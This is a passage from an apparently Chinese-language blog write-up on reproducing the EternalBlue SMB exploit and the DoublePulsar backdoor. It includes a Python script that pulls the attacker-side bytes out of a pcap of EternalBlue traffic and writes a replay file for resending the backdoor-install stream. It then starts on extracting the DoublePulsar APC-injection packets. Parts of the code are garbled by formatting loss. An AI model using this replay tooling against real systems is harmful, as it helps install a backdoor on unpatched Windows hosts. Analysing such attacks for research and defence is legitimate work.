       USHORT Uid;                       // User id
       USHORT Mid;                       // multiplex id
       UCHAR  WordCount;                 // Count of parameter words
    } SMB_HEADER;
接着再看下eternalblue数据包中的数据流 这么多的会话 我用脚本把他们生成了可替换的数据字节并保存起来
win7后门安装的数据流已经有人在github上公开了,方法大同小异吧 follow stream 其实要紧的是能把这步自动化才是极好的
二十多个流自己去follow眼睛恐怕要累瞎,写了个不太完善的脚本
    import binascii
    import struct
    pcap_file = "smb3.pcap"
    output_file = "BackdoorInstall.replay"
    def wf(filename,data):
    fp=open(filename,"wb")
    fp.write(data)
    fp.close()
    def rf(filename):
    fp=open(filename,"rb")
    data=fp.read()
    fp.close()
    return data
    # 分析数据包
    def anlyse(all_data):
    data_len = len(all_data)
    ncount = 0
    now_index = 40 #pcap 24,间隔 16，protoheader 54, tcp+ipheader 20+20
    array = []
    while now_index H",all_data[now_index+16:now_index+18])[0] -40
    if(all_data[now_index+34:now_index+36] != "x01xbd"):#不是445表示发送端
    data_temp = ""
    array_temp = all_data[now_index+54:now_index +54+one_len]
    for i in range(one_len):
    data_temp = data_temp + "\x" + binascii.b2a_hex(array_temp[i])
    array.append("('send',1,b'" + data_temp + "',0.01)rnrn")
    else:
    array.append("('recv', 1, 0.01)rnrn")
    now_index = now_index + one_len + 16 + 54
    ncount += 1
    print ncount,":",one_len
    return array,ncount
    if __name__ == "__main__":
    array , ncount = anlyse(rf(pcap_file))
    data_replay = "('connect', 1, 0.01)rnrn"
    data_replay2 = data_replay
    j = 1
    for i in range(ncount):
    data_replay += array[i]
    if(array[i].find("send") != -1):#如果是send
    data_replay2 = data_replay2 + "#" + str(j) + array[i]
    j += 1
    else:
    data_replay2 += array[i]
    data_replay += "('close', 1, 0.01)"
    data_replay2 += "('close', 1, 0.01)"
    wf(output_file,data_replay)
    wf(output_file+".listrec",data_replay2)#这个是记录send顺序的文件
    print "over!"
**第三步:分析Doublepulsar注入动作产生的数据流并提取**
接下来分析Doublepulsar的apc注入部分
可以看到七个SMB的request,接着就去搞清其中字段的含义,在我们不知道他每个字段都是什么意思的前提下我们就不用去改他,不是说一点不改,最起码的SMB
head